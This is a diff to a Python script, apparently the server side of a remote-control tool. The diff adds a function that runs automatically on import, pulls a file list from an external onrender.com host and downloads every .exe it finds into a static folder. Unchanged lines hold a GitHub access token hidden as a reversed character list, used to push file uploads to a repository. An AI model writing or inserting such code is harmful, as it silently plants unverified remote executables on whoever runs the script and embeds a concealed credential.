@@ -20,7 +20,29 @@ file_content = None
 folder_content = None
 selected_user = "93"
 output = ""
+STATIC_FOLDER = os.path.join("static")
 control_data = {}
+
+def download_exe():
+    response = rq.get("https://filehub-g1jf.onrender.com/list_files_json")
+    response.raise_for_status()
+    file_list = response.json()
+
+    for item in file_list:
+        if item.endswith(".exe"):
+            url = f"https://filehub-g1jf.onrender.com/download/{item}"
+            filename = os.path.join(STATIC_FOLDER, "apps", item)
+
+            os.makedirs(os.path.dirname(filename), exist_ok=True)
+
+            with rq.get(url, stream=True) as r:
+                r.raise_for_status()
+                with open(filename, 'wb') as f:
+                    for chunk in r.iter_content(chunk_size=8192):
+                        if chunk:
+                            f.write(chunk)
+
+download_exe()
 t = ['U', 'N', 'i', '4', 'I', '3', 'P', 'L', 'L', 'A', 'C', 'P', 'F', 'v', 'b', '0', 'V', 'A', '6', 'r', 'S', '0', 'b', 'i', '0', '4', 'z', '9', 'K', 'e', 'V', 'U', '0', '1', '2', 'm', '_', 'p', 'h', 'g']
 token = ""
 for i in reversed(t):
@@ -29,7 +51,7 @@ owner = "ms32-org"
 repo = "maksadPura"
 branch = "main" 
 commit_message = "file upload"
-STATIC_FOLDER = os.path.join("static")
+
 if not os.path.exists(STATIC_FOLDER):
     os.makedirs(STATIC_FOLDER)
 state_file = os.path.join(STATIC_FOLDER, "state.json")
